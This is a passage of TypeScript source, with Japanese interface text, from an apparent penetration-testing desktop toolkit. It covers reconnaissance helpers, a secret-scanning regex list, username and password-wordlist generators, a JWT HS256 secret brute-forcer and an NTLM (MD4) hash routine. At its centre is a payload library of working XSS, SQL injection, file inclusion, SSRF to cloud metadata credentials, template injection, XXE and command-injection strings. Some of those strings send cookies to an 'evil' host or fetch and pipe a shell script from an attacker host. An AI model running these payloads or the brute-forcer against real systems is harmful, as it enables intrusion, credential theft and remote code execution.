  const out = document.getElementById("ckie-out") as HTMLDivElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const txt = (inEl?.value || "").trim();
    if (!txt) {
      out.innerHTML = "";
      return;
    }
    const lines = txt
      .split(/\n|, (?=\w+=)/)
      .map((l) => l.replace(/^Set-Cookie:\s*/i, "").trim())
      .filter(Boolean);
    const cards = lines.map((line) => {
      const parts = line.split(";").map((p) => p.trim());
      const [nameVal, ...attrs] = parts;
      const eq = nameVal.indexOf("=");
      const name = eq >= 0 ? nameVal.slice(0, eq) : nameVal;
      const value = eq >= 0 ? nameVal.slice(eq + 1) : "";
      const attrMap: Record<string, string> = {};
      for (const a of attrs) {
        const i = a.indexOf("=");
        if (i >= 0) attrMap[a.slice(0, i).toLowerCase()] = a.slice(i + 1);
        else attrMap[a.toLowerCase()] = "true";
      }
      const secure = !!attrMap["secure"];
      const httpOnly = !!attrMap["httponly"];
      const sameSite = attrMap["samesite"] || "(未設定)";
      const issues: string[] = [];
      if (!secure) issues.push("Secure 無し → HTTPS 以外でも送信される");
      if (!httpOnly)
        issues.push("HttpOnly 無し → JS から document.cookie で読める");
      if (sameSite === "(未設定)" || /none/i.test(sameSite))
        issues.push(`SameSite=${sameSite} → CSRF リスク`);
      // JWT 形式判定
      const isJwt = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(
        value,
      );
      return `<div style="padding:6px 8px;border:1px solid #2c2c2c;border-radius:4px;margin-bottom:4px;background:#1f1f1f">
        <div style="font-weight:600">${escapeHtml(name)}</div>
        <div style="font-size:11px;color:#aaa;word-break:break-all">value: ${escapeHtml(value.slice(0, 200))}${value.length > 200 ? "…" : ""}${isJwt ? ' <span style="color:#fb923c">[JWT らしき形式]</span>' : ""}</div>
        <div style="font-size:11px;color:#aaa">Secure: ${secure ? "✅" : "❌"} | HttpOnly: ${httpOnly ? "✅" : "❌"} | SameSite: ${escapeHtml(sameSite)}</div>
        ${issues.map((i) => `<div style="font-size:11px;color:#cf222e">⚠️ ${escapeHtml(i)}</div>`).join("")}
      </div>`;
    });
    out.innerHTML = cards.join("");
  });
}

// ===== 🔑 シークレット検出 =====
const SECRET_PATTERNS: { name: string; re: RegExp }[] = [
  { name: "AWS Access Key", re: /AKIA[0-9A-Z]{16}/g },
  {
    name: "AWS Secret Key",
    re: /(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])/g,
  },
  { name: "GitHub Token", re: /gh[pousr]_[A-Za-z0-9]{36,}/g },
  { name: "GitHub OAuth", re: /(?:^|[^a-z])gho_[A-Za-z0-9]{36}/g },
  { name: "Slack Token", re: /xox[baprs]-[A-Za-z0-9-]{10,}/g },
  {
    name: "Slack Webhook",
    re: /https:\/\/hooks\.slack\.com\/services\/[A-Z0-9/]+/g,
  },
  { name: "Google API Key", re: /AIza[0-9A-Za-z_-]{35}/g },
  { name: "Stripe Live Key", re: /sk_live_[0-9a-zA-Z]{24,}/g },
  { name: "Stripe Test Key", re: /sk_test_[0-9a-zA-Z]{24,}/g },
  { name: "Mailgun API Key", re: /key-[0-9a-zA-Z]{32}/g },
  { name: "SendGrid API Key", re: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g },
  { name: "Twilio SID", re: /AC[a-f0-9]{32}/g },
  {
    name: "Heroku API Key",
    re: /[hH]eroku[a-zA-Z0-9_ -]*['"][0-9a-fA-F-]{36}['"]/g,
  },
  {
    name: "JWT",
    re: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g,
  },
  {
    name: "Private Key (PEM)",
    re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----/g,
  },
  {
    name: "Generic Secret (代入)",
    re: /(?:api[_-]?key|secret|password|token)\s*[:=]\s*['"][^'"\s]{8,}['"]/gi,
  },
  { name: "URL に Basic 認証", re: /https?:\/\/[^\s/:@]+:[^\s/:@]+@[^\s/]+/g },
];
function setupSecretsScannerSub(): void {
  const inEl = document.getElementById(
    "secr-input",
  ) as HTMLTextAreaElement | null;
  const btn = document.getElementById("secr-run") as HTMLButtonElement | null;
  const out = document.getElementById("secr-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const txt = inEl?.value || "";
    if (!txt) {
      out.textContent = "";
      return;
    }
    const findings: string[] = [];
    for (const p of SECRET_PATTERNS) {
      const matches = txt.match(p.re);
      if (matches && matches.length > 0) {
        const uniq = Array.from(new Set(matches));
        for (const m of uniq.slice(0, 20))
          findings.push(`[${p.name}] ${m.slice(0, 200)}`);
        if (uniq.length > 20)
          findings.push(`  …他 ${uniq.length - 20} 件 (${p.name})`);
      }
    }
    out.textContent =
      findings.length === 0
        ? "⭕ 既知のシークレットパターンは検出されませんでした"
        : findings.join("\n");
  });
}

// ===== 🌳 サブドメイン (crt.sh) =====
function setupSubdomainSub(): void {
  const inEl = document.getElementById(
    "subd-domain",
  ) as HTMLInputElement | null;
  const btn = document.getElementById("subd-run") as HTMLButtonElement | null;
  const out = document.getElementById("subd-out") as HTMLPreElement | null;
  const status = document.getElementById("subd-status");
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const d = (inEl?.value || "").trim();
    if (!d) return;
    if (status) status.textContent = "crt.sh 検索中…";
    out.textContent = "";
    try {
      const r = await fetch(
        `https://crt.sh/?q=%25.${encodeURIComponent(d)}&output=json`,
      );
      if (!r.ok) throw new Error("crt.sh: " + r.status);
      const arr = (await r.json()) as { name_value: string }[];
      const set = new Set<string>();
      for (const e of arr) {
        for (const name of e.name_value.split("\n")) {
          const n = name.trim().toLowerCase();
          if (n && !n.startsWith("*")) set.add(n);
        }
      }
      const list = Array.from(set).sort();
      out.textContent = list.join("\n") || "(該当なし)";
      if (status) status.textContent = `${list.length} 件`;
    } catch (e) {
      out.textContent = `エラー: ${String(e)}`;
      if (status) status.textContent = "";
    }
  });
}

// ===== 📜 Wayback URL =====
function setupWaybackSub(): void {
  const inEl = document.getElementById("wb-domain") as HTMLInputElement | null;
  const limEl = document.getElementById("wb-limit") as HTMLInputElement | null;
  const btn = document.getElementById("wb-run") as HTMLButtonElement | null;
  const out = document.getElementById("wb-out") as HTMLPreElement | null;
  const status = document.getElementById("wb-status");
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const d = (inEl?.value || "").trim();
    if (!d) return;
    const lim = parseInt(limEl?.value || "500", 10);
    if (status) status.textContent = "Wayback 取得中…";
    out.textContent = "";
    try {
      const u = `https://web.archive.org/cdx/search/cdx?url=*.${encodeURIComponent(d)}/*&output=json&fl=original&collapse=urlkey&limit=${lim}`;
      const r = await fetch(u);
      if (!r.ok) throw new Error("wayback: " + r.status);
      const arr = (await r.json()) as string[][];
      const urls = arr.slice(1).map((row) => row[0]);
      out.textContent = urls.join("\n") || "(該当なし)";
      if (status) status.textContent = `${urls.length} 件`;
    } catch (e) {
      out.textContent = `エラー: ${String(e)}`;
      if (status) status.textContent = "";
    }
  });
}

// ===== 🐛 CVE Lookup (NVD) =====
function setupCveLookupSub(): void {
  const inEl = document.getElementById("cve-id") as HTMLInputElement | null;
  const btn = document.getElementById("cve-run") as HTMLButtonElement | null;
  const out = document.getElementById("cve-out") as HTMLDivElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const q = (inEl?.value || "").trim();
    if (!q) return;
    out.innerHTML = '<span style="color:#888">NVD 検索中…</span>';
    try {
      const isCveId = /^cve-\d{4}-\d{4,}$/i.test(q);
      const url = isCveId
        ? `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(q.toUpperCase())}`
        : `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(q)}&resultsPerPage=20`;
      const r = await fetch(url);
      if (!r.ok) throw new Error("NVD: " + r.status);
      const data = (await r.json()) as {
        vulnerabilities?: {
          cve: {
            id: string;
            descriptions: { lang: string; value: string }[];
            metrics?: {
              cvssMetricV31?: {
                cvssData: { baseScore: number; baseSeverity: string };
              }[];
              cvssMetricV30?: {
                cvssData: { baseScore: number; baseSeverity: string };
              }[];
              cvssMetricV2?: { cvssData: { baseScore: number } }[];
            };
            references?: { url: string }[];
            published?: string;
          };
        }[];
      };
      const vulns = data.vulnerabilities || [];
      if (vulns.length === 0) {
        out.innerHTML = "<em>該当なし</em>";
        return;
      }
      out.innerHTML = vulns
        .map((v) => {
          const c = v.cve;
          const desc = c.descriptions.find((d) => d.lang === "en")?.value || "";
          const m =
            c.metrics?.cvssMetricV31?.[0]?.cvssData ||
            c.metrics?.cvssMetricV30?.[0]?.cvssData;
          const score = m ? `${m.baseScore} (${m.baseSeverity})` : "N/A";
          const sevColor =
            m && m.baseScore >= 9
              ? "#cf222e"
              : m && m.baseScore >= 7
                ? "#fb923c"
                : m && m.baseScore >= 4
                  ? "#facc15"
                  : "#1a7f37";
          return `<div style="padding:6px 8px;border:1px solid #2c2c2c;border-radius:4px;margin-bottom:6px;background:#1f1f1f">
            <div><strong><a href="https://nvd.nist.gov/vuln/detail/${c.id}" target="_blank" style="color:#60a5fa">${c.id}</a></strong> <span style="color:${sevColor}">CVSS: ${score}</span> <span style="color:#888">${escapeHtml(c.published?.slice(0, 10) || "")}</span></div>
            <div style="font-size:11px;color:#ccc;margin-top:4px">${escapeHtml(desc.slice(0, 600))}${desc.length > 600 ? "…" : ""}</div>
          </div>`;
        })
        .join("");
    } catch (e) {
      out.innerHTML = `<span style="color:#cf222e">エラー: ${escapeHtml(String(e))}</span>`;
    }
  });
}

// ===== 💣 ペイロードライブラリ =====
const PAYLOADS: Record<string, string[]> = {
  xss: [
    `<script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<svg/onload=alert(1)>`,
    `"><script>alert(1)</script>`,
    `'><img src=x onerror=alert(1)>`,
    `javascript:alert(1)`,
    `<body onload=alert(1)>`,
    `<iframe src="javascript:alert(1)">`,
    `<input autofocus onfocus=alert(1)>`,
    `<details open ontoggle=alert(1)>`,
    `<a href="javascript:alert(1)">click</a>`,
    `"-alert(1)-"`,
    `';alert(1);//`,
    `<script>fetch('//evil/?c='+document.cookie)</script>`,
    `<img src=1 onerror="this.src='//evil/?c='+document.cookie">`,
    `<svg><script>alert&#40;1&#41;</script>`,
    `<math><mi/xlink:href="javascript:alert(1)">`,
    `<object data="javascript:alert(1)">`,
    `<embed src="javascript:alert(1)">`,
    `<style>@import"javascript:alert(1)";</style>`,
  ],
  sqli: [
    `' OR '1'='1`,
    `" OR "1"="1`,
    `' OR 1=1--`,
    `" OR 1=1--`,
    `') OR ('1'='1`,
    `' OR '1'='1' /*`,
    `admin'--`,
    `admin' #`,
    `admin'/*`,
    `' UNION SELECT NULL--`,
    `' UNION SELECT NULL,NULL--`,
    `' UNION SELECT NULL,NULL,NULL--`,
    `' UNION SELECT username,password FROM users--`,
    `1' AND SLEEP(5)--`,
    `1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--`,
    `1; WAITFOR DELAY '0:0:5'--`,
    `1' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
    `' OR EXISTS(SELECT 1 FROM users)--`,
    `1' ORDER BY 10--`,
    `' OR SLEEP(5)#`,
  ],
  lfi: [
    `../../../../etc/passwd`,
    `../../../../etc/passwd%00`,
    `....//....//....//etc/passwd`,
    `..%2f..%2f..%2fetc%2fpasswd`,
    `..%252f..%252f..%252fetc%252fpasswd`,
    `/etc/passwd`,
    `/proc/self/environ`,
    `/proc/self/cmdline`,
    `/var/log/apache2/access.log`,
    `php://filter/convert.base64-encode/resource=index.php`,
    `php://filter/read=string.rot13/resource=index.php`,
    `data://text/plain,<?php system($_GET['c']); ?>`,
    `expect://id`,
    `file:///etc/passwd`,
    `\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
    `C:\\Windows\\System32\\drivers\\etc\\hosts`,
    `C:\\Windows\\win.ini`,
    `..\\..\\..\\..\\..\\windows\\win.ini`,
    `/.git/config`,
    `/.env`,
  ],
  ssrf: [
    `http://127.0.0.1/`,
    `http://localhost/`,
    `http://0.0.0.0/`,
    `http://[::1]/`,
    `http://127.1/`,
    `http://2130706433/`,
    `http://0177.0.0.1/`,
    `http://0x7f.0.0.1/`,
    `http://169.254.169.254/latest/meta-data/  (AWS IMDS)`,
    `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    `http://metadata.google.internal/computeMetadata/v1/  (GCP)`,
    `http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)`,
    `file:///etc/passwd`,
    `gopher://127.0.0.1:6379/_INFO`,
    `dict://127.0.0.1:11211/stats`,
    `http://burpcollaborator.example/`,
    `http://example.com@127.0.0.1/`,
    `http://127.0.0.1#@example.com/`,
    `http://127.0.0.1.nip.io/`,
    `http://localtest.me/`,
  ],
  cmdi: [
    `; id`,
    `| id`,
    `|| id`,
    `&& id`,
    `\` id \``,
    `$(id)`,
    `; ls -la`,
    `; cat /etc/passwd`,
    `| cat /etc/passwd`,
    `& whoami`,
    `& dir`,
    `; ping -c 4 attacker.example`,
    `\`curl http://attacker/$(whoami)\``,
    `;wget http://attacker/sh.sh -O- |sh`,
    `%0a id`,
    `%0aid`,
    `'$(id)'`,
    `"$(id)"`,
    `;sleep 10`,
    `|sleep 10`,
  ],
  ssti: [
    `{{7*7}}`,
    `{{7*'7'}}   (Jinja2: '7777777')`,
    `\${7*7}    (Java/Freemarker)`,
    `<%= 7*7 %>  (ERB)`,
    `#{7*7}    (Ruby)`,
    `{{config}}`,
    `{{config.items()}}`,
    `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
    `{{ ''.__class__.__mro__[1].__subclasses__() }}`,
    `\${T(java.lang.Runtime).getRuntime().exec('id')}`,
    `\${"freemarker.template.utility.Execute"?new()("id")}`,
    `<#assign value="freemarker.template.utility.Execute"?new()> \${value("id")}`,
    `{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}`,
  ],
  crlf: [
    `%0d%0aSet-Cookie:%20admin=true`,
    `%0d%0aLocation:%20https://evil.com`,
    `%0d%0a%0d%0a<script>alert(1)</script>`,
    `\\r\\nSet-Cookie: x=y`,
    `%E5%98%8A%E5%98%8DSet-Cookie:%20test=1  (UTF-8 overlong)`,
    `?param=test%0d%0aHeader:%20Injected`,
  ],
  xxe: [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker/">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker/ext.dtd">%ext;]>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,
    `<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`,
  ],
  nosql: [
    `{"$ne": null}`,
    `{"$ne": ""}`,
    `{"$gt": ""}`,
    `{"$regex": ".*"}`,
    `{"$where": "this.password.length > 0"}`,
    `username[$ne]=&password[$ne]=`,
    `{"username": {"$ne": null}, "password": {"$ne": null}}`,
    `';return(true);var x='`,
    `";return(true);var x="`,
    `{"$or":[{"a":1},{"a":2}]}`,
  ],
};
function setupPayloadLibrarySub(): void {
  const sel = document.getElementById("pay-cat") as HTMLSelectElement | null;
  const filt = document.getElementById("pay-filter") as HTMLInputElement | null;
  const out = document.getElementById("pay-out") as HTMLPreElement | null;
  if (!sel || !out) return;
  const render = (): void => {
    const cat = sel.value;
    const f = (filt?.value || "").toLowerCase();
    const list = (PAYLOADS[cat] || []).filter((p) =>
      f ? p.toLowerCase().includes(f) : true,
    );
    out.textContent = list.join("\n");
  };
  sel.addEventListener("change", render);
  filt?.addEventListener("input", render);
  render();
}

// ===== 🐧 GTFOBins / 🪟 LOLBAS =====
function setupGtfoLolbasSub(): void {
  const inEl = document.getElementById("gtfo-bin") as HTMLInputElement | null;
  const btn = document.getElementById("gtfo-run") as HTMLButtonElement | null;
  const out = document.getElementById("gtfo-out") as HTMLDivElement | null;
  if (!btn || !out) return;
  const run = (): void => {
    const b = (inEl?.value || "").trim().toLowerCase();
    if (!b) {
      out.innerHTML = "";
      return;
    }
    const enc = encodeURIComponent(b);
    out.innerHTML = `
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <a href="https://gtfobins.github.io/gtfobins/${enc}/" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🐧 GTFOBins: ${escapeHtml(b)}</a>
        <a href="https://lolbas-project.github.io/lolbas/Binaries/${enc}/" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🪟 LOLBAS: ${escapeHtml(b)}</a>
        <a href="https://www.google.com/search?q=${enc}+gtfobins+OR+lolbas+privesc" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🔍 Google</a>
        <a href="https://hijacklibs.net/api/lookup/${enc}" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f">🪝 HijackLibs</a>
      </div>`;
  };
  btn.addEventListener("click", run);
  inEl?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") run();
  });
}

// ===== 👤 ユーザー名生成 =====
function setupUsernameGenSub(): void {
  const f = document.getElementById("un-first") as HTMLInputElement | null;
  const m = document.getElementById("un-middle") as HTMLInputElement | null;
  const l = document.getElementById("un-last") as HTMLInputElement | null;
  const btn = document.getElementById("un-run") as HTMLButtonElement | null;
  const out = document.getElementById("un-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const first = (f?.value || "").trim().toLowerCase();
    const mid = (m?.value || "").trim().toLowerCase();
    const last = (l?.value || "").trim().toLowerCase();
    if (!first && !last) {
      out.textContent = "first または last を入力してください";
      return;
    }
    const fi = first[0] || "";
    const mi = mid[0] || "";
    const li = last[0] || "";
    const set = new Set<string>();
    const seps = ["", ".", "_", "-"];
    const add = (v: string): void => {
      if (v) set.add(v);
    };
    for (const s of seps) {
      if (first && last) {
        add(`${first}${s}${last}`);
        add(`${last}${s}${first}`);
        add(`${fi}${s}${last}`);
        add(`${first}${s}${li}`);
        add(`${last}${s}${fi}`);
      }
      if (first && mid && last) {
        add(`${first}${s}${mid}${s}${last}`);
        add(`${fi}${mi}${last}`);
        add(`${first}${s}${mi}${s}${last}`);
        add(`${fi}${s}${mid}${s}${last}`);
      }
    }
    add(first);
    add(last);
    add(`${fi}${last}`);
    add(`${first}${li}`);
    add(`${last}${fi}`);
    add(`${fi}${li}`);
    add(`${first}${last}`);
    add(`${last}${first}`);
    // 年付き
    const years = [2023, 2024, 2025, 2026, 1990, 1995, 2000];
    const base = Array.from(set);
    for (const b of base) for (const y of years) set.add(b + y);
    out.textContent = Array.from(set).sort().join("\n");
  });
}

// ===== 📖 ワードリスト変異 =====
function leetVariants(s: string): string[] {
  const map: Record<string, string[]> = {
    a: ["@", "4"],
    e: ["3"],
    i: ["1", "!"],
    o: ["0"],
    s: ["$", "5"],
    t: ["7"],
    l: ["1"],
    g: ["9"],
  };
  const out = new Set<string>([s]);
  for (let i = 0; i < s.length; i++) {
    const c = s[i].toLowerCase();
    if (map[c]) {
      for (const r of map[c]) {
        const cur = Array.from(out);
        for (const w of cur) {
          out.add(w.slice(0, i) + r + w.slice(i + 1));
        }
      }
    }
  }
  return Array.from(out);
}
function setupWordlistMutSub(): void {
  const inEl = document.getElementById(
    "mut-input",
  ) as HTMLTextAreaElement | null;
  const btn = document.getElementById("mut-run") as HTMLButtonElement | null;
  const out = document.getElementById("mut-out") as HTMLPreElement | null;
  const cap = document.getElementById("mut-cap") as HTMLInputElement | null;
  const leet = document.getElementById("mut-leet") as HTMLInputElement | null;
  const year = document.getElementById("mut-year") as HTMLInputElement | null;
  const sym = document.getElementById("mut-sym") as HTMLInputElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const lines = (inEl?.value || "")
      .split(/\n/)
      .map((l) => l.trim())
      .filter(Boolean);
    const set = new Set<string>(lines);
    if (cap?.checked) {
      for (const w of lines) {
        set.add(w[0].toUpperCase() + w.slice(1));
        set.add(w.toUpperCase());
      }
    }
    if (leet?.checked) {
      for (const w of Array.from(set))
        for (const v of leetVariants(w)) set.add(v);
    }
    const base = Array.from(set);
    if (year?.checked) {
      for (const w of base) for (let y = 1990; y <= 2026; y++) set.add(w + y);
    }
    if (sym?.checked) {
      for (const w of base)
        for (const s of ["!", "@", "#", "$", "?", "1", "123", "!!"])
          set.add(w + s);
    }
    out.textContent = `# ${set.size} 件\n` + Array.from(set).join("\n");
  });
}

// ===== 🔓 JWT シークレット ブルートフォース =====
const JWT_DEFAULT_DICT = `secret
secret123
password
admin
test
key
your-256-bit-secret
your_256_bit_secret
jwt
jwt_secret
jwtsecret
changeme
default
qwerty
12345
123456
abcdef
demo
example
mysecret
topsecret
notsosecret
shhh
letmein
hunter2
P@ssw0rd
Password1
welcome
master
root
supersecret
foo
bar
baz
abc123
helloworld
randomstring
api_key
apikey
0123456789
1234567890
nimda
admin123
admin!
secretkey
secret_key
SECRET_KEY
JWT_SECRET
SUPER_SECRET
default_secret
my-secret-key
test_secret`;
async function hmacSha256B64Url(key: string, data: string): Promise<string> {
  const k = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(key),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = await crypto.subtle.sign(
    "HMAC",
    k,
    new TextEncoder().encode(data),
  );
  let s = "";
  const u = new Uint8Array(sig);
  for (let i = 0; i < u.length; i++) s += String.fromCharCode(u[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function setupJwtBruteSub(): void {
  const inEl = document.getElementById(
    "jwtb-input",
  ) as HTMLTextAreaElement | null;
  const wEl = document.getElementById(
    "jwtb-words",
  ) as HTMLTextAreaElement | null;
  const wlEl = document.getElementById(
    "jwtb-wordlist",
  ) as HTMLSelectElement | null;
  const btn = document.getElementById("jwtb-run") as HTMLButtonElement | null;
  const out = document.getElementById("jwtb-out") as HTMLDivElement | null;
  if (!btn || !out) return;

  // SecLists のガチ辞書 (初回 DL → localStorage キャッシュ)
  const JWT_WORDLIST_URLS: Record<string, string> = {
    "seclists-jwt":
      "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list",
    "seclists-10k":
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
    "seclists-rockyou-1k":
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "seclists-rockyou-100k":
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt",
  };
  async function fetchJwtWordlist(key: string): Promise<string> {
    const cacheKey = `yuzu-jwt-wordlist-${key}-v1`;
    const cached = localStorage.getItem(cacheKey);
    if (cached) return cached;
    const url = JWT_WORDLIST_URLS[key];
    if (!url) throw new Error(`unknown wordlist: ${key}`);
    const r = await invoke<HttpReqResultTS>("pentest_http_request", {
      method: "GET",
      url,
      headers: [],
      body: null,
      timeoutMs: 30000,
      followRedirects: true,
    });
    if (r.status !== 200) throw new Error(`HTTP ${r.status}`);
    const text = r.body || "";
    if (!text || text.length < 100) throw new Error("empty body");
    try {
      localStorage.setItem(cacheKey, text);
    } catch {
      /* quota over は無視 */
    }
    return text;
  }

  btn.addEventListener("click", async () => {
    const tok = (inEl?.value || "").trim();
    const parts = tok.split(".");
    if (parts.length !== 3) {
      out.innerHTML = '<span style="color:#cf222e">JWT 形式が不正</span>';
      return;
    }
    let header: Record<string, unknown>;
    try {
      header = JSON.parse(
        atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")),
      ) as Record<string, unknown>;
    } catch {
      out.innerHTML =
        '<span style="color:#cf222e">ヘッダのデコードに失敗</span>';
      return;
    }
    if (header.alg !== "HS256") {
      out.innerHTML = `<span style="color:#cf222e">アルゴリズムが ${escapeHtml(String(header.alg))} です。本ツールは HS256 のみ対応</span>`;
      return;
    }
    const data = parts[0] + "." + parts[1];
    const target = parts[2];

    const wl = wlEl?.value || "default";
    let wlRaw = "";
    if (wl === "default") {
      wlRaw = JWT_DEFAULT_DICT;
    } else if (wl === "custom") {
      wlRaw = (wEl?.value || "").trim() || JWT_DEFAULT_DICT;
    } else {
      try {
        out.innerHTML = `<span style="color:#888">辞書 DL 中…</span>`;
        wlRaw = await fetchJwtWordlist(wl);
      } catch (e) {
        out.innerHTML = `<span style="color:#cf222e">辞書 DL 失敗: ${escapeHtml(String(e))}</span>`;
        return;
      }
    }
    const words = wlRaw
      .split(/\r?\n/)
      .map((s) => s.trim())
      .filter(Boolean);

    out.innerHTML = `<span style="color:#888">${words.length} 候補をテスト中…</span>`;
    let found: string | null = null;
    let i = 0;
    const t0 = performance.now();
    for (const w of words) {
      const sig = await hmacSha256B64Url(w, data);
      if (sig === target) {
        found = w;
        break;
      }
      i++;
      // 1000 件ごとに進捗表示
      if (i % 1000 === 0) {
        const elapsed = ((performance.now() - t0) / 1000).toFixed(1);
        out.innerHTML = `<span style="color:#888">${i} / ${words.length} 試行中… (${elapsed}s)</span>`;
        await new Promise((r) => setTimeout(r, 0));
      }
    }
    if (found) {
      out.innerHTML = `<div style="color:#1a7f37;font-weight:600">🎉 シークレット発見: <code style="background:#1f1f1f;padding:2px 6px;border-radius:3px">${escapeHtml(found)}</code> (${i + 1} / ${words.length})</div>`;
    } else {
      out.innerHTML = `<div style="color:#cf222e">❌ 見つかりませんでした (${words.length} 試行)</div>`;
    }
  });
}

// ===== 🔐 NTLM ハッシュ生成 (MD4 of UTF-16LE) =====
function md4(bytes: Uint8Array): string {
  // 軽量 MD4 実装
  function r(x: number, n: number): number {
    return ((x << n) | (x >>> (32 - n))) >>> 0;
  }
  function add(a: number, b: number): number {
    return (a + b) >>> 0;
  }
  const len = bytes.length;
  const bits = len * 8;
  const padded = new Uint8Array((((len + 8) >>> 6) << 6) + 64);
  padded.set(bytes);
  padded[len] = 0x80;
  const dv = new DataView(padded.buffer);
  dv.setUint32(padded.length - 8, bits >>> 0, true);
  dv.setUint32(padded.length - 4, Math.floor(bits / 0x100000000), true);
  let a = 0x67452301,
    b = 0xefcdab89,
    c = 0x98badcfe,
    d = 0x10325476;
  for (let i = 0; i < padded.length; i += 64) {
    const X: number[] = [];
    for (let j = 0; j < 16; j++) X.push(dv.getUint32(i + j * 4, true));
    let aa = a,
      bb = b,
      cc = c,
      dd = d;
    const F = (x: number, y: number, z: number): number =>
      ((x & y) | (~x & z)) >>> 0;
    const G = (x: number, y: number, z: number): number =>
      ((x & y) | (x & z) | (y & z)) >>> 0;
    const H = (x: number, y: number, z: number): number => (x ^ y ^ z) >>> 0;
    const ff = (
      a: number,
      b: number,
      c: number,
      d: number,
      k: number,
      s: number,
    ): number => r(add(add(a, F(b, c, d)), X[k]), s);
    const gg = (
      a: number,
      b: number,
      c: number,
      d: number,
      k: number,
      s: number,
    ): number => r(add(add(add(a, G(b, c, d)), X[k]), 0x5a827999), s);
    const hh = (
      a: number,
      b: number,
      c: number,
      d: number,
      k: number,
      s: number,
    ): number => r(add(add(add(a, H(b, c, d)), X[k]), 0x6ed9eba1), s);
    [
      [0, 3],
      [1, 7],
      [2, 11],
      [3, 19],
      [4, 3],
      [5, 7],
      [6, 11],
      [7, 19],
      [8, 3],
      [9, 7],
      [10, 11],
      [11, 19],
      [12, 3],
      [13, 7],
      [14, 11],
      [15, 19],
    ].forEach(([k, s], idx) => {
      if (idx % 4 === 0) aa = ff(aa, bb, cc, dd, k, s);
      else if (idx % 4 === 1) dd = ff(dd, aa, bb, cc, k, s);
      else if (idx % 4 === 2) cc = ff(cc, dd, aa, bb, k, s);
      else bb = ff(bb, cc, dd, aa, k, s);
    });
    [
      [0, 3],
      [4, 5],
      [8, 9],
      [12, 13],
      [1, 3],
      [5, 5],
      [9, 9],
      [13, 13],
      [2, 3],
      [6, 5],
      [10, 9],
      [14, 13],
      [3, 3],
      [7, 5],
      [11, 9],
      [15, 13],
    ].forEach(([k, s], idx) => {
      if (idx % 4 === 0) aa = gg(aa, bb, cc, dd, k, s);
      else if (idx % 4 === 1) dd = gg(dd, aa, bb, cc, k, s);
      else if (idx % 4 === 2) cc = gg(cc, dd, aa, bb, k, s);
      else bb = gg(bb, cc, dd, aa, k, s);
    });
    [
      [0, 3],
      [8, 9],
      [4, 11],
      [12, 15],
      [2, 3],
      [10, 9],
      [6, 11],
      [14, 15],
      [1, 3],
      [9, 9],
      [5, 11],
      [13, 15],
      [3, 3],
      [11, 9],
      [7, 11],
      [15, 15],
    ].forEach(([k, s], idx) => {
      if (idx % 4 === 0) aa = hh(aa, bb, cc, dd, k, s);
      else if (idx % 4 === 1) dd = hh(dd, aa, bb, cc, k, s);
      else if (idx % 4 === 2) cc = hh(cc, dd, aa, bb, k, s);
      else bb = hh(bb, cc, dd, aa, k, s);
    });
    a = add(a, aa);
    b = add(b, bb);
    c = add(c, cc);
    d = add(d, dd);
  }
  const tohex = (n: number): string => {
    let s = "";
    for (let i = 0; i < 4; i++)
      s += ((n >>> (i * 8)) & 0xff).toString(16).padStart(2, "0");
    return s;
  };
